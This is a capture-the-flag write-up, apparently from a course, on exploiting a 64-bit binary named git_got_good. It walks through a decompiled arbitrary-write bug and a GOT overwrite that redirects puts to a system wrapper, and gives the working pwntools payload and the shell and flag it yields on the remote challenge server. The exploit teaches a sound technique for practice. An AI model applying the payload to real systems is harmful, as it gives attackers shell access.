Writeup for [[Git it GOT it, Good]]
Location`nc offsec-chalbroker.osiris.cyber.nyu.edu 1341`
Flag: `flag{y0u_sur3_GOT_it_g00d!}`
Lore: `Yu Gi Oh`

###### First Run:
```
┌──(kali㉿kali)-[~/Desktop/5-Week]
└─$ ./git_got_good 
Welcome! The time is Wed Feb 28 04:28:11 PM EST 2024
That is, it's time to d-d-d-d-d-d-d-duel
Anyways, give me a string to save: Hello
Ok, I'm writing Hello
 to my buffer...
Hello
```

However
###### Canary:
```
[*] '/home/kali/Desktop/5-Week/git_got_good'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
This may make stack overflow attacks a problem
###### Ghidra:
```c
undefined8 main(EVP_PKEY_CTX *param_1)

{
  //...omitted for brevity...
  printf("Welcome! The time is ");
  run_cmd("/bin/date");
  puts("That is, it\'s time to d-d-d-d-d-d-d-duel");
  printf("Anyways, give me a string to save: ");
  fgets((char *)&data,0x18,stdin);
  printf("Ok, I\'m writing %s to my buffer...\n",&data);
  *bfr = data;
  bfr[1] = x;
  puts((char *)&data);
  //...omitted for brevity...
  return 0;
}
```

Right away, noticed call to `run_cmd`. It happens before input so no way to influence that first call, but maybe we can call it again later
```
void run_cmd(char *param_1)
{
  system(param_1);
  return;
}
```


### Running with a silly amount of input
###### Run
```
┌──(kali㉿kali)-[~/Desktop/5-Week]
└─$ python3 -c "print('A'*25)"
AAAAAAAAAAAAAAAAAAAAAAAAA
┌──(kali㉿kali)-[~/Desktop/5-Week]
└─$ gdb ./git_got_good 
Welcome! The time is [Detaching after vfork from child process 593386]
Wed Feb 28 04:39:56 PM EST 2024
That is, it's time to d-d-d-d-d-d-d-duel
Anyways, give me a string to save: AAAAAAAAAAAAAAAAAAAAAAAAA
```
Twenty-five A's
#### And we get a segfault!
###### Location:
```
Program received signal SIGSEGV, Segmentation fault.
0x0000000000400800 in main ()
   0x00000000004007ef <+132>:   call   0x4005e0 <printf@plt>
   0x00000000004007f4 <+137>:   mov    -0x10(%rbp),%rcx
   0x00000000004007f8 <+141>:   mov    -0x20(%rbp),%rax
   0x00000000004007fc <+145>:   mov    -0x18(%rbp),%rdx
=> 0x0000000000400800 <+149>:   mov    %rax,(%rcx)
```
###### Registers:
```
rax            0x4141414141414141  4702111234474983745
rbx            0x7fffffffdef8      140737488346872
rcx            0x41414141414141    18367622009667905
rdx            0x4141414141414141  4702111234474983745
rsi            0x7fffffffdc10      140737488346128
rdi            0x7fffffffdbe0      140737488346080
rbp            0x7fffffffdde0      0x7fffffffdde0
rsp            0x7fffffffddc0      0x7fffffffddc0
rip            0x400800            0x400800 <main+149>
```
###### Stack
```
0x7fffffffddc0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffddd0: 0x41414141      0x00414141      0x3c3f4200      0x876a4165
0x7fffffffdde0: 0x00000001      0x00000000      0xf7df26ca      0x00007fff
```
So all of my A's that I input were stored in  `rdx` `rax` and `rcx` and then it tried to look at the address stored in `rcx`

#### Let's look at the code to see why!
###### Moves
```
   0x00000000004007f4 <+137>:   mov    -0x10(%rbp),%rcx
   0x00000000004007f8 <+141>:   mov    -0x20(%rbp),%rax
   0x00000000004007fc <+145>:   mov    -0x18(%rbp),%rdx
   0x0000000000400800 <+149>:   mov    %rax,(%rcx)
   0x0000000000400803 <+152>:   mov    %rdx,0x8(%rcx)
```
##### `0x4007f4 mov -0x10(%rbp),%rcx`
`mov    -0x10(%rbp),%rcx` 
Moves data from `rbp-8` through `rbp - 16` into `rcx`
##### `0x4007f8 mov -0x20(%rbp),%rax`
`mov    -0x20(%rbp),%rax`
Moves data from `rbp-24` through `rbp-32` into `rax`
##### `0x4007fc mov -0x18(%rbp),%rdx`
`mov    -0x18(%rbp),%rdx`
Moves data from `rbp-16` through `rbp-24` into `rdx`

Then we get to our segfault at:
##### `0x400800 mov %rax,(%rcx)`
`mov    %rax,(%rcx)`
Moves the data stored in `rax` into the **address** that `rcx` points to
	This means the value stored in `rcx` **must** be an address
This is where we tend to get a segfault
##### `0x400803 mov %rdx,0x8(%rcx)`
`mov    %rdx,0x8(%rcx)`
Moves the data stored in `rdx` into `rcx+8`
	In this case, `rcx` holds an address, and this stores the data at that address + 8

#### So with that information:
I think I can build a payload that will overwrite an arbitrary address if formatted like
```
[16 Bytes of Data] + [Addr]
```
###### What even is writeable?
```
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/kali/Desktop/5-Week/git_got_good
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/kali/Desktop/5-Week/git_got_good
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/kali/Desktop/5-Week/git_got_good
```

Only these lines: `0x0000000000601000 - 0x0000000000602000` which is outside of the (executable) program code (which is good for them, things that are executable should not be writable)
###### What's in the writable memory?
![[Pasted image 20240303201505.png]]
This contains all of those third party library calls, which each contains the address of an external function
Can we overwrite them?

Puts addr = `0x601018`

At `0x400800`, where that overwriting happens, the only system call we have left is a `puts`
```
gef➤  disas main
Dump of assembler code for function main:
   ...omitted for brevity...
   0x00000000004007ef <+132>:   call   0x4005e0 <printf@plt>
   0x00000000004007f4 <+137>:   mov    rcx,QWORD PTR [rbp-0x10]
   0x00000000004007f8 <+141>:   mov    rax,QWORD PTR [rbp-0x20]
   0x00000000004007fc <+145>:   mov    rdx,QWORD PTR [rbp-0x18]
=> 0x0000000000400800 <+149>:   mov    QWORD PTR [rcx],rax
   0x0000000000400803 <+152>:   mov    QWORD PTR [rcx+0x8],rdx
   0x0000000000400807 <+156>:   lea    rax,[rbp-0x20]
   0x000000000040080b <+160>:   mov    rdi,rax
   0x000000000040080e <+163>:   call   0x4005b0 <puts@plt>
   ...omitted for brevity...
End of assembler dump.
```
So can I overwrite the address stored in `puts` with the address of...say that call to `run_cmd`?
###### Address of `run_cmd`
![[Pasted image 20240303201345.png]]
### Building a Payload (I should make this it's own section in the thing)
###### Handy dandy chart
| Data | Command text | Addr( run_cmd) | Addr(puts) |
| ---- | ---- | ---- | ---- |
| Written to | [rcx] | [rcx-8] | rcx |
| Register | rax | rdx | rcx |
| Location in rbp | [rbp-24] - [rbp-31] | [rbp-16] - [rbp-23] | [rbp-8] - [rbp-15] |
| Location in Payload | p[0-7] | p[8-15] | p[16-23] |
So the payload is stored in `rbp` from `[rbp-8]` to `[rbp-32]`.  Each 8 byte section of `rbp` is stored in a different register and then acted upon as seen in the moves.
###### Payload
```python
def pld():
	cmd = p64(0x68732F6E69622F)
	rcAddr = p64(0x4B07400000000000)
	pAddr  = p64(18106000000000000)
	return cmd + rcAddr + pAddr
```
Chose `/bin/sh` as my command because `cat flag.txt` is too long
All payload data is reversed
##### Attempt 1:
###### Code
```python
def testPld():
	p =  process('/bin/bash')
	p.sendline('gdb ./git_got_good -q')
	p.sendline("break *0x0000000000400800")
	p.sendline("r")
	p.recvuntil("save:")
	p.sendline(pld())
	p.interactive()
```
###### Registers
```
Breakpoint 1, 0x0000000000400800 in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
 registers ────
$rax   : 0x68732f6e69622f  
$rbx   : 0x00007fffffffdef8  →  0x00007fffffffe268  → "/home/kali/Desktop/5-Week/git_got_good"
$rcx   : 0x40534fa24da000  
$rdx   : 0x4b07400000000000
$rsp   : 0x00007fffffffddc0  →  0x0068732f6e69622f ("/bin/sh"?)
$rbp   : 0x00007fffffffdde0  →  0x0000000000000001
$rsi   : 0x00007fffffffdc10  →  0x206d2749202c6b4f ("Ok, I'm "?)
$rdi   : 0x00007fffffffdbe0  →  0x00007fffffffdc10  →  0x206d2749202c6b4f ("Ok, I'm "?)
$rip   : 0x0000000000400800  →  <main+149> mov QWORD PTR [rcx], rax
```
###### Stack
```
0x00007fffffffddc0│+0x0000: 0x0068732f6e69622f ("/bin/sh"?)     ← $rsp
0x00007fffffffddc8│+0x0008: 0x4b07400000000000
0x00007fffffffddd0│+0x0010: 0x0040534fa24da000
0x00007fffffffddd8│+0x0018: 0xbd2acba24bd33000
0x00007fffffffdde0│+0x0020: 0x0000000000000001     ← $rbp
```

I'm not sure what happened to my `rcx` but I know my `rdx` is reversed
### Successful Attempt
###### Code
```python
def pld():
	cmd = p64(0x68732F6E69622F)
	rcAddr = p64(0x000000000040074B)
	pAddr  = p64(0x0000000000601010)
	return cmd + rcAddr + pAddr
```
Test
```python
def testPld():
	p =  process('/bin/bash')
	p.sendline('gdb ./git_got_good -q')
	p.sendline("break *0x0000000000400800")
	p.sendline("break *0x000000000040080e")
	p.sendline("r")
	p.recvuntil("save:")
	p.sendline(pld())
	p.interactive()
```
###### Registers
```
$rax   : 0x68732f6e69622f  
$rbx   : 0x00007fffffffdef8  →  0x00007fffffffe268  →  "/home/kali/Desktop/5-Week/git_got_good"
$rcx   : 0x0000000000601010  →  0x00007ffff7fdd300  →  <_dl_runtime_resolve_xsave+0> push rbx
$rdx   : 0x000000000040074b  →  <run_cmd+0> push rbp
$rsp   : 0x00007fffffffddc0  →  0x0068732f6e69622f ("/bin/sh"?)
$rbp   : 0x00007fffffffdde0  →  0x0000000000000001
$rsi   : 0x00007fffffffdc10  →  0x206d2749202c6b4f ("Ok, I'm "?)
$rdi   : 0x00007fffffffdbe0  →  0x00007fffffffdc10  →  0x206d2749202c6b4f ("Ok, I'm "?)
$rip   : 0x0000000000400800  →  <main+149> mov QWORD PTR [rcx], rax
$r8    : 0x73              
$r9    : 0x1               
$r10   : 0x0               
$r11   : 0x202             
$r12   : 0x0               
$r13   : 0x00007fffffffdf08  →  0x00007fffffffe28f  →  "SHELL=/usr/bin/zsh"
```
###### Stack:
```
0x00007fffffffddc0│+0x0000: 0x0068732f6e69622f ("/bin/sh"?)     ← $rsp
0x00007fffffffddc8│+0x0008: 0x000000000040074b  →  <run_cmd+0> push rbp
0x00007fffffffddd0│+0x0010: 0x0000000000601010  →  0x00007ffff7fdd300  →  <_dl_runtime_resolve_xsave+0> push rbx
0x00007fffffffddd8│+0x0018: 0x635fc6a8b393a100
0x00007fffffffdde0│+0x0020: 0x0000000000000001     ← $rbp
```

Added a breakpoint right before the call to `puts` to see if it's overwritten correctly:
```
gef➤  $ break *0x40080e
Breakpoint 2 at 0x40080e

Breakpoint 2, 0x000000000040080e in main ()
 code:x86:64 ────
     0x400803 <main+152>       mov    QWORD PTR [rcx+0x8], rdx
     0x400807 <main+156>       lea    rax, [rbp-0x20]
     0x40080b <main+160>       mov    rdi, rax
●→   0x40080e <main+163>       call   0x4005b0 <puts@plt>
   ↳    0x4005b0 <puts@plt+0>     jmp    QWORD PTR [rip+0x200a62]    # 0x601018 <puts@got.plt>
gef➤  $ x/2x 0x00601018
0x601018 <puts@got.plt>:    0x0040074b    0x00000000
```
We can see the address of `run_cmd` stored there, yay!

For comparison, this is what it looks like if I had just entered "hello"
```
Breakpoint 1, 0x000000000040080e in main ()
 →   0x40080e <main+163>       call   0x4005b0 <puts@plt>
   ↳    0x4005b0 <puts@plt+0>     jmp    QWORD PTR [rip+0x200a62]    # 0x601018 <puts@got.plt>
gef➤  x/2x 0x601018
0x601018 <puts@got.plt>:        0xf7e40b00      0x00007fff
```

YAY I WIN!
```
gef➤  $ c
Continuing.
[Detaching after vfork from child process 440715]
$ whoami
kali
$ pwd
/home/kali/Desktop/5-Week
$  zsh: suspended (signal)  python3 GitGOTGood_Pwn.py
```

Discuss, why does this work even with the stack canary?

### Exploitation
### Local:
###### Code:
```python
def localShell():
	p = process("./git_got_good")
	p.recvuntil("save:")
	p.sendline(pld())
	p.interactive()
```
###### Results:
```
└─$ python3 GitGOTGood_Pwn.py
[+] Starting local process './git_got_good': pid 443187
[*] Switching to interactive mode
 Ok, I'm writing /bin/sh to my buffer...
$ whoami
kali
$ pwd
/home/kali/Desktop/5-Week
```
### Remote:
###### Code:
```python
def remoteShell():
	p = remote(HOST, PORT)
	p.recvuntil("save:")
	p.sendline(pld())
	p.interactive()
```
###### Results:
```
┌──(kali㉿kali)-[~/Desktop/5-Week]
└─$ python3 GitGOTGood_Pwn.py
[+] Opening connection to offsec-chalbroker.osiris.cyber.nyu.edu on port 1341: Done
[*] Switching to interactive mode
 Ok, I'm writing /bin/sh to my buffer...
$ whoami
pwn
$ ls
flag.txt
git_got_good
$ cat flag.txt
flag{y0u_sur3_GOT_it_g00d!}
$  zsh: suspended (signal)  python3 GitGOTGood_Pwn.py
```

